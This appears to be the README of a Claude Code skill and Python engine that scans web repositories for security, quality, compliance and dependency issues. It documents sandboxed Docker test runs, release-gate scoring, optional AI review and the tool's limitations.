# Vibe Coding QA

<p align="center">
  <img src="phone-mascots.gif" alt="Looping cartoon of Mario and Luigi in red and green outfits" width="560">
</p>

A Claude Code skill and Python engine for taking product ideas and AI-assisted web projects from research to a safer, evidence-based launch. It helps assess product opportunities before building, then **inspect real repositories, run automated security and quality checks, map findings to file and line numbers, suggest or apply fixes, rerun tests, and block release** when critical issues remain.

## Install

Clone this repository and open it in Claude Code; the skill is available at `.claude/skills/vibe-coding-qa/SKILL.md`.

To add it to another project, copy the `vibe-coding-qa` folder into that project's `.claude/skills/` directory.

[Download the skill bundle](https://github.com/stratonflorentin-dot/vibe-coding-qa/raw/refs/heads/main/vibe-coding-qa.zip)

## Local Dashboard (v0.5.0)

The optional dashboard runs the existing Python scanning engine through a local FastAPI API and a React interface. The CLI remains usable without installing dashboard dependencies.

Install the backend extras from the repository root:

```powershell
python -m pip install -r requirements-dashboard.txt
```

Start the API in one terminal:

```powershell
python -m dashboard.backend
```

In a second terminal, install and start the frontend:

```powershell
cd dashboard/frontend
npm ci
npm run dev
```

Open `http://127.0.0.1:5173`. The API is available at `http://127.0.0.1:8756/api/docs`. The default repository allowlist includes the current user's home directory and this project; set `VCQA_ALLOWED_REPO_ROOTS` to add other approved roots. The backend refuses non-loopback bind hosts because remote access has no authentication layer.

AI is optional. Configure credentials in the backend process environment before starting it; they are never submitted from the browser or stored in SQLite:

```powershell
$env:VCQA_AI_PROVIDER = 'openrouter'
$env:VCQA_AI_API_KEY = 'your-server-side-key'
$env:VCQA_AI_BASE_URL = 'https://openrouter.ai/api/v1'
$env:VCQA_AI_MODEL = 'openai/gpt-3.5-turbo'
python -m dashboard.backend
```

Scans persist in `dashboard/data/vcqa.sqlite3`. Docker test execution is disabled by default and requires both operator enablement in Settings and explicit per-scan permission. The backend never pulls images or installs repository dependencies.

The dashboard includes persisted overview metrics, repositories, real scan jobs and SSE events, scan comparison, findings and triage, static architecture and dependency views, AI chat/reviews/remediation proposals, reports, and scan/AI settings. Limitations: architecture relationships are static-analysis evidence rather than a runtime graph; reports can be printed to PDF by the browser but do not currently have server-side PDF generation; GitHub pull-request/CI integrations, SARIF export, authentication, and verified post-patch rescan workflows are not implemented. AI output remains advisory and never controls the release gate.

## What it helps with

- **Product intelligence:** research product ideas, markets, competitors, customer pain, feasibility, and MVP strategy before investing in a build.
- **Engineering QA:** clone or point to a repo and scan actual source code for security, quality, database, infrastructure, performance, compliance, and dependency/supply-chain issues.
- **File-and-line findings:** every issue includes the file path and line number.
- **Fixes:** preview or apply safe automated fixes (e.g. remove `console.log`, strip `debugger`) with path validation, backups, diffs, and rollback.
- **Tests:** detects npm scripts, pytest, and standard-library unittest; execution requires `--explicit-permission` and an available Docker daemon plus a locally available image. The original repository is never mutated: a temporary secret-filtered snapshot is mounted read-only and copied into a size-bounded writable workspace before the suite runs, with networking disabled, a read-only root filesystem, memory/CPU/PID limits, and a wall-clock timeout. Images are never pulled automatically. Test status is decided by classification (see below), not by the exit code alone.
- **Release gate:** score the repo 0-100 with explainable deductions; deduplicate findings; configurable thresholds; reports one of `PASS`, `FAIL`, `BLOCKED`, or `NOT VERIFIED`.
- **Framework guidance:** plan features, trust boundaries, authentication, RLS, secrets, input validation, CSRF, API abuse controls, TLS/headers, email/SMS flows, and Tanzania-focused privacy checks.
- **External tools:** optionally integrate Fallow, REA, PentAGI, API Anything, and UI guidance.
- **AI-assisted review (optional):** provider-agnostic interface for OpenRouter/Groq-compatible APIs; reads credentials from environment; core works without it.

## What to expect

It won’t do everything automatically: external tools must be installed and configured, the research command creates a brief rather than conducting live research, and static analysis can only find patterns, not prove runtime behavior. The engine distinguishes high-confidence detections from heuristics and asks a human to verify anything that requires runtime context.

## Automated QA Engine

The scanner uses only the Python standard library (and Git for repository cloning). Test execution additionally requires a running Docker daemon and a locally available image; the CLI never pulls images or installs project dependencies.

```bash
# Scan a local repository
python -m vibe_coding_qa.cli scan --repo /path/to/project --output vcqa-reports

# Scan a public GitHub repository
python -m vibe_coding_qa.cli scan --repo stratonflorentin-dot/vibe-coding-qa --output vcqa-reports

# Run detected tests (project scripts execute code; this explicit flag is required)
python -m vibe_coding_qa.cli scan --repo /path/to/project --explicit-permission --output vcqa-reports

# Static analysis only (test execution is skipped and decision is NOT VERIFIED)
python -m vibe_coding_qa.cli scan --repo /path/to/project --no-execution --output vcqa-reports

# Preview safe fixes
python -m vibe_coding_qa.cli fix --repo /path/to/project --output vcqa-reports

# Apply safe fixes (review the report first)
python -m vibe_coding_qa.cli fix --repo /path/to/project --apply --output vcqa-reports

# Run a release gate with explicit test permission
python -m vibe_coding_qa.cli gate --repo /path/to/project --explicit-permission --test-timeout 300 --max-memory-mb 512 --max-cpu-seconds 60 --output vcqa-reports

# Static-only gate; decision is NOT VERIFIED, not PASS
python -m vibe_coding_qa.cli gate --repo /path/to/project --no-execution --output vcqa-reports
```

Reports are written as `vcqa-report.md`, `vcqa-report.json`, and `vcqa-report.html` in the output directory. For private GitHub repositories, set `VCQA_GITHUB_TOKEN` (or `GITHUB_TOKEN`) in the environment; the CLI intentionally accepts no token argument to avoid process-list exposure. Credentials are used through a temporary Git credential store and removed after cloning.

### What the engine checks

| Module | Examples |
|--------|----------|
| **Security** | exposed secrets, client-side API keys, `.env` files, insecure eval, wildcard CORS, SQL injection patterns, unvalidated file uploads, path traversal, SSRF, insecure cookies, debug endpoints, shell execution, rate limits, session secrets, Firebase rules |
| **Quality** | `console.log`, `debugger`, `TODO/FIXME`, `any` types, missing error boundaries, source maps in production |
| **Database** | missing RLS, weak RLS policies, editable role fields, client-side role updates, Supabase query auth review, Prisma RLS review |
| **Infrastructure** | weak TLS, missing HSTS/CSP/X-Frame-Options, Docker `latest` tags, root user in containers, exposed ports |
| **Performance** | blocking handlers, large images, large source files |
| **Compliance** | Tanzania PDPA consent checkboxes, RFC 8058 unsubscribe, TCRA SMS opt-out, DPO/PDPC documentation |
| **Dependencies** | outdated/vulnerable packages, missing lockfiles, CI workflow risks (pull_request_target, outdated checkout, secrets in PRs), Docker risks, license hints |

The gate uses the same stored assessment in CLI output and Markdown/JSON/HTML reports. `PASS` means all configured criteria and tests passed; `FAIL` means a non-critical threshold or test failed; `BLOCKED` means a critical finding remains; and `NOT VERIFIED` means tests were skipped, unavailable, or not executed. Exit codes are `0` pass, `1` fail, `2` blocked, and `3` not verified.

The engine returns a weighted 0-100 score and never treats skipped test execution as a successful verification.

### Test status classification

A zero exit code alone never produces `PASS`. The engine parses the runner output and classifies every test as discovered, executed, passed, failed, skipped, or errored, then decides:

| Result | Decision |
|--------|----------|
| At least one test executed, none failed, exit code 0 | `PASS` |
| Any test failed or errored | `FAIL` |
| All tests skipped | `NOT VERIFIED` |
| No tests discovered | `NOT VERIFIED` |
| Output not recognized as a known runner | `NOT VERIFIED` |
| Docker daemon or required dependency unavailable | `NOT VERIFIED` |
| Timeout or output/resource limit exceeded | `FAIL` |

Supported output parsers: Python `unittest` and `pytest`, and JavaScript `Jest` and `Vitest`. The same authoritative decision is used by the CLI, the release gate, and the Markdown/JSON/HTML reports; a custom command that simply exits 0 without recognized test output is reported as `NOT VERIFIED`, not `PASS`.

### Docker workspace design

Isolated test execution keeps the audited repository untouched:

1. A temporary snapshot of the repository is created with common secret files removed (`.env*` except `.env.example`, credential files, private-key extensions) and detected credentials redacted in copied text files.
2. The snapshot is bind-mounted **read-only** at `/vcqa-src`.
3. A separate size-bounded **writable** tmpfs is mounted at `/workspace`; the snapshot is copied into it before the test command runs, and the working directory is set there. Build artifacts and temp files are allowed; the container root filesystem stays read-only.
4. The container runs with `--network none`, `--cap-drop ALL`, `--security-opt no-new-privileges`, read-only rootfs, memory/CPU/PID limits, a bounded `/tmp` and `/workspace`, `--shm-size 1m`, and a wall-clock timeout. Only an allowlisted set of environment variables is inherited.
5. The snapshot is removed after the run, including on failure paths.

### Dependency preparation

The engine **never installs packages or pulls images**. If a dependency is missing, the run is reported as `NOT VERIFIED` (infrastructure unavailable) rather than `PASS`. To provide dependencies without network access inside the sandbox, prepare a local image ahead of time and select it with `--test-image`:

```bash
# Python project with pytest already installed
docker build -t my-org/vcqa-python:latest - <<'EOF'
FROM python:3.12-slim
RUN pip install --no-cache-dir pytest
EOF

# Node project with dependencies installed
docker build -t my-org/vcqa-node:latest - <<'EOF'
FROM node:22-bookworm-slim
EOF

python -m vibe_coding_qa.cli scan --repo /path/to/project \
  --explicit-permission --test-image my-org/vcqa-python:latest --output vcqa-reports
```

Default images are `python:3.12-slim` and `node:22-bookworm-slim`. `node_modules`, virtual environments, and credential files are not copied into the snapshot, so for Node projects install dependencies into the image (or a base image that already contains them) rather than relying on the working tree. If the selected image is not available locally, the run stops with `NOT VERIFIED` and never pulls.

### Limitations

- Static analysis only: it cannot prove runtime behavior, access control bypasses, or business-logic bugs.
- Pattern-based detection produces false positives and false negatives; treat every finding as a review prompt, not a certification.
- Test execution is opt-in and requires Docker. The engine copies a secret-filtered snapshot into a bounded writable workspace, mounts the snapshot read-only rather than mounting the original repository, disables networking, keeps the container root filesystem read-only, applies memory/CPU/PID limits and a wall-clock timeout, and captures output within a bounded size. It does not inherit developer environment variables. Container isolation is not a proof against all kernel/runtime vulnerabilities; tests remain unverified if the daemon, image, or a required dependency is unavailable. Make the selected image available before the audit (default images are `python:3.12-slim` and `node:22-bookworm-slim`), or set `--test-image`; the CLI does not pull images or install project dependencies.
- Dependency checks use local package metadata and conservative historical heuristics by default. Optional OSV lookup is explicit and offline by default. It resolves npm `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, Python `poetry.lock`, `uv.lock`, `Pipfile.lock`, and exactly pinned `requirements.txt` dependencies; npm transitive lock entries are included. Results are queried by exact package version, capped at 250 dependencies, and report the OSV advisory source; other lockfile formats and unresolved version ranges remain outside coverage. Failed or timed-out OSV lookups are reported as incomplete coverage, never as a clean result.
- Secret detection inspects the matched credential value, not the file name or the surrounding text. Real credentials are still reported inside test, fixture, mock, and example files, and private keys are always reported. Genuinely synthetic placeholders (for example `your-api-key-here` or `xxxx`) may be suppressed; review such matches in context.
- Database RLS analysis is a conservative, identifier-aware heuristic, not a full PostgreSQL parser. Complex constructs (dynamic SQL, `DO` blocks, `plpgsql` functions) are reported as coverage limitations, and optional `pglast` validation is used when installed.
- Compliance checks are heuristics, not legal advice; confirm requirements with official sources and qualified specialists.

## Repository automation and branch protection

The CI workflow in [`.github/workflows/tests.yml`](.github/workflows/tests.yml) runs the unit-test matrix (Python 3.10/3.11/3.12) and a Docker integration job that executes real containers through the production code path. Recommended repository settings (configure these in GitHub; the tool never changes external repository settings):

- Mark the `unittest` (all matrix versions) and `docker-integration` checks as required status checks on the protected branch.
- Require the branch to be up to date before merging and require a pull request review.
- Keep the default workflow `permissions: contents: read`.

Run the Docker integration tests locally with:

```bash
docker pull python:3.12-slim
VCQA_DOCKER_INTEGRATION=1 python -m unittest discover -s tests -p "test_docker_integration.py" -v
```

Without `VCQA_DOCKER_INTEGRATION=1` those tests are skipped, so the standard unit-test suite needs no Docker.

## Configuration

Create a `.vcqaignore` file in the repository root to exclude paths from scanning (one pattern per line, supports globs and directory names):

```
# Example .vcqaignore
dist/
build/
*.generated.ts
vendor/
```

Set environment variables for optional AI review:

```bash
export VCQA_AI_PROVIDER=openrouter
export VCQA_AI_API_KEY=your-key
export VCQA_AI_BASE_URL=https://openrouter.ai/api/v1
export VCQA_AI_MODEL=openai/gpt-3.5-turbo
```

AI review is optional. The default request contains finding metadata only; source snippets are not read unless `VCQA_AI_INCLUDE_SOURCE=1` is explicitly set. Secret-related findings are excluded unless `VCQA_AI_INCLUDE_SECRETS=1`; any opted-in content is redacted before transmission, but review the provider and data handling before enabling sharing.

Optional OSV online lookup is disabled by default. Enable it with `VCQA_OSV_ENABLED=1`; network failures are reported as incomplete scanner notes, and static/local scanning remains available offline.

Configure the release gate minimum score with `VCQA_MINIMUM_SCORE` (for example, `70`). On Windows Command Prompt, use `set VCQA_MINIMUM_SCORE=70`; in PowerShell, use `$env:VCQA_MINIMUM_SCORE = '70'`.

## Reports

Reports include:
- **Technology stack** (languages, frameworks, package manager, databases, auth providers, test runners, deployment targets)
- **Test results** (status, command, duration, skipped count)
- **Fixes** (applied/skipped with diffs in preview mode)
- **Coverage gaps** (missing tests, lockfiles, auth, CI, .gitignore)
- **Findings** grouped by severity with file/line, message, suggestion, confidence, and auto-fixability
- **Score explanation** with per-finding penalty breakdown

Formats: Markdown (`vcqa-report.md`), JSON (`vcqa-report.json`), HTML (`vcqa-report.html` with escaped content).

## Existing Skill CLI

The original skill CLI remains available for research briefs, checklists, templates, and external tool adapters:

```bash
# From the skill directory
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py --help

# Product research
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py research --product "AI code review tool" --mode deep --output research-brief.md

# Pre-launch audit checklists
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py audit --checklist launch
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py audit --checklist security
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py audit --checklist tanzania

# Work templates
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py template --type feature-brief
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py template --type verification
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py template --type finding
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py template --type launch-decision

# Install skill into another project
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py init --path /path/to/project

# Optional external tool integrations
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py tools doctor
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py tools fallow --action audit --root .
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py tools ui-guide --topic stress

# Validate skill structure
python .claude/skills/vibe-coding-qa/scripts/vibe_coding_qa.py validate
```

The skill CLI loads reference files from `.claude/skills/vibe-coding-qa/references/` and can be used independently of the agent skill. It does not perform live web research; it creates a brief for the agent to execute with authorized research tools. Optional adapters run Fallow and REA, make a read-only PentAGI status request, guard API Anything calls, and print UI review guidance; see [`scripts/tool-integrations.md`](.claude/skills/vibe-coding-qa/scripts/tool-integrations.md) for setup, exact limits, and examples. External tools are not installed automatically.

The skill records what was actually verified and flags unknowns. Its regulatory checklists are not legal advice or compliance certification; confirm current requirements with official sources and qualified specialists.

## Mascot animation

The looping cartoon GIF is generated with Python and Pillow. Recreate it from the repository root with:

```sh
python -m pip install pillow
python scripts/generate_mascots.py
```
